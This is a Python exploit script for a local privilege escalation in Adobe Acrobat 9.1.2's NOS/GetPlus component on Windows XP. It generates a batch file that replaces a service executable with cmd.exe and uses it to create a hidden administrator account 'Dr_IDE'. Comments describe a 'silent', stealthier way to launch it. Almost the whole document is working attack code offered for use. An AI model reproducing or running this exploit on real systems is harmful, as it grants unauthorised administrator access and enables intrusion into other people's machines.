#!/usr/bin/env python
##################################################################################
#
# Adobe Acrobat v9.1.2 Local Privilege Escalation Exploit
# Coded By: Dr_IDE
# Discovered by: Nine:Situations:Group
# Tested On: Windows XP SP2, Requires NOS Package Installed
# Usage: python Dr_IDE-Adobe_912.py
#
##################################################################################

import os, subprocess

#
# Should probably have a try block around this as not every install
# of 9.1.2 has the NOS package on it. This is a little touchy so you may have to
# play around with it.
#
# This is a super lame way to do this but it makes it more educational.
evil =  "echo *************************************************************\n"
evil += "echo *\n"
evil += "echo * Adobe Acrobat v9.1.2 Local Privilege Escalation Exploit\n"
evil += "echo * Coded By: Dr_IDE\n"
evil += "echo * Discovered By: Nine:Situations:Group\n"
evil += "echo * Tested On: Windows XP SP2\n"
evil += "echo *\n"
evil += "echo *************************************************************\n"
evil += "echo This will add user Dr_IDE:password to the Admin Group\n"
evil += "cd C:\\Program Files\\NOS\\bin\n"
evil += "copy /Y GetPlus_HelperSvc.exe GetPlus_HelperSvc.old\n"
evil += "copy /Y %systemroot%\\system32\\cmd.exe\n"
evil += "GetPlus_HelperSvc.exe /C net user Dr_IDE password /ADD\n"
evil += "GetPlus_HelperSvc.exe /C net localgroup administrators Dr_IDE /ADD\n"
evil += "GetPlus_HelperSvc.exe /C net user Dr_IDE\n"
evil += "exit"

f1 = open('Dr_IDE-Adobe.bat','w');
f1.write(evil);
f1.close();

# Here are two ways to execute this exploit. If you leave both commented just the batch file is created.

# Silent Way - This should be more stealthy
#retval = subprocess.call("Dr_IDE-Adobe.bat");

# Louder Way - On some systems this will probably open a DOS window
#retval = os.system("Dr_IDE-Adobe.bat");
